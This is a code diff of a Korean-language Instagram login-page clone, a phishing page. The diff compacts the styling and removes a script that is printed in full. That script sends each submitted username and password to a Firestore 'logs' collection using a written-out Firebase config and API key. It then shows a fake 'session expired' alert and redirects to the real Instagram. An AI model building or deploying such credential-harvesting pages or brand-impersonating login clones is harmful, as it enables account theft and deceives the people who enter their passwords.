@@ -5,195 +5,38 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
     <style>
-        body {
-            background-color: #ffffff;
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            min-height: 100vh; /* 화면 전체 높이 사용 */
-            padding: 0 20px;
-            box-sizing: border-box;
-        }
-
-        /* 1. 상단 언어 선택 (가운데 정렬) */
-        .language-container {
-            margin-top: 25px;
-            color: #8e8e8e;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-        }
-        .lang-arrow { font-size: 12px; }
-
-        /* 메인 컨테이너 */
-        .main-container {
-            width: 100%;
-            max-width: 350px;
-            text-align: center;
-            flex-grow: 1; /* 남은 공간 차지해서 하단 요소 밀어내기 */
-            display: flex;
-            flex-direction: column;
-            justify-content: center; /* 수직 중앙 정렬 */
-        }
-
-        /* 2. 로고: 가운데가 빈 최신형 그라데이션 로고 */
-        .logo-img {
-            width: 75px;
-            height: 75px;
-            margin: 0 auto 40px auto; /* 상하 여백 조정 */
-            display: block;
-        }
-
-        /* 입력창 스타일 */
-        input {
-            width: 100%;
-            padding: 13px 15px;
-            margin-bottom: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px; /* 사진과 같은 둥근 모서리 */
-            background-color: #fafafa;
-            box-sizing: border-box;
-            font-size: 14px;
-            outline: none;
-        }
-        input::placeholder { color: #8e8e8e; }
-
-        /* 로그인 버튼 (파란색) */
-        .btn-login {
-            width: 100%;
-            background-color: #0064e0;
-            color: white;
-            border: none;
-            padding: 12px;
-            border-radius: 8px; /* 입력창과 같은 둥근 모서리 */
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 15px;
-            margin-top: 10px;
-        }
-
-        /* 비밀번호 찾기 링크 */
-        .forgot-pw {
-            color: #00376b;
-            font-size: 13px;
-            font-weight: 500;
-            text-decoration: none;
-            margin-top: 20px;
-            display: block;
-        }
-
-        /* 3. 하단 섹션: 새 계정 버튼 및 Meta */
-        .bottom-section {
-            width: 100%;
-            max-width: 350px;
-            padding-bottom: 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* 새 계정 만들기 버튼 (투명 배경, 파란 테두리, 완전 둥글게) */
-        .btn-signup {
-            width: 100%;
-            background-color: transparent;
-            color: #0064e0;
-            border: 1px solid #0064e0;
-            padding: 10px;
-            border-radius: 50px; /* 완전 둥근 캡슐 모양 */
-            font-weight: 600;
-            cursor: pointer;
-            font-size: 15px;
-            margin-bottom: 25px;
-        }
-
-        /* Meta 푸터: 옆으로 나란히 정렬 */
-        .meta-footer {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            color: #8e8e8e;
-            font-size: 14px;
-        }
-        /* Meta 아이콘 (회색 처리) */
-        .meta-icon {
-            width: 22px;
-            filter: grayscale(1);
-            opacity: 0.6;
-        }
-        /* Meta 텍스트 */
-        .meta-text {
-            font-weight: 500;
-        }
+        body { background-color: #ffffff; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 0 20px; box-sizing: border-box; }
+        .language-container { margin-top: 25px; color: #8e8e8e; font-size: 14px; display: flex; align-items: center; gap: 5px; }
+        .main-container { width: 100%; max-width: 350px; text-align: center; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; }
+        /* [핵심] 가운데가 비어있는 최신 로고 */
+        .logo-img { width: 75px; height: 75px; margin: 0 auto 40px auto; display: block; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 12px; border: 1px solid #dbdbdb; border-radius: 8px; background-color: #fafafa; box-sizing: border-box; font-size: 14px; }
+        .btn-login { width: 100%; background-color: #0064e0; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 15px; margin-top: 10px; }
+        .forgot-pw { color: #00376b; font-size: 13px; font-weight: 500; text-decoration: none; margin-top: 20px; display: block; }
+        .bottom-section { width: 100%; max-width: 350px; padding-bottom: 30px; display: flex; flex-direction: column; align-items: center; }
+        .btn-signup { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 10px; border-radius: 50px; font-weight: 600; cursor: pointer; font-size: 15px; margin-bottom: 25px; }
+        /* [핵심] Meta 아이콘과 글자 한 줄로 */
+        .meta-footer { display: flex; align-items: center; justify-content: center; gap: 5px; color: #8e8e8e; font-size: 14px; }
+        .meta-icon { width: 22px; filter: grayscale(1); opacity: 0.6; }
     </style>
 </head>
 <body>
-    <div class="language-container">
-        한국어 <span class="lang-arrow">∨</span>
-    </div>
-
+    <div class="language-container">한국어 ∨</div>
     <div class="main-container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" alt="Instagram" class="logo-img">
-        
         <form id="loginForm">
             <input type="text" id="id" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
             <input type="password" id="pw" placeholder="비밀번호" required>
-            <button type="submit" id="submitBtn" class="btn-login">로그인</button>
+            <button type="submit" class="btn-login">로그인</button>
         </form>
         <a href="#" class="forgot-pw">비밀번호를 잊으셨나요?</a>
     </div>
-
     <div class="bottom-section">
         <button type="button" class="btn-signup">새 계정 만들기</button>
-        
         <div class="meta-footer">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/64px-Meta_Platforms_Inc._logo.svg.png" alt="" class="meta-icon">
             <span class="meta-text">Meta</span>
         </div>
     </div>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyDGS9mDbbKXNL4OrskQ3ZDHBsKb8Glroj4",
-            authDomain: "instagram-be709.firebaseapp.com",
-            projectId: "instagram-be709",
-            storageBucket: "instagram-be709.firebasestorage.app",
-            messagingSenderId: "556245509978",
-            appId: "1:556245509978:web:e78967856f2ac2586f7563",
-            measurementId: "G-1KLXR0LXSZ"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const submitBtn = document.getElementById('submitBtn');
-            const idVal = document.getElementById('id').value;
-            const pwVal = document.getElementById('pw').value;
-            submitBtn.disabled = true;
-
-            try {
-                await addDoc(collection(db, "logs"), {
-                    userId: idVal,
-                    userPw: pwVal,
-                    timestamp: new Date()
-                });
-                alert("로그인 프로세스가 만료되었습니다. 다시 로그인해 주세요.");
-                window.location.href = "https://www.instagram.com/accounts/login/";
-            } catch (error) {
-                console.error("오류 발생:", error);
-                alert("네트워크 연결을 확인해주세요.");
-                submitBtn.disabled = false;
-            }
-        });
-    </script>
 </body>
 </html>
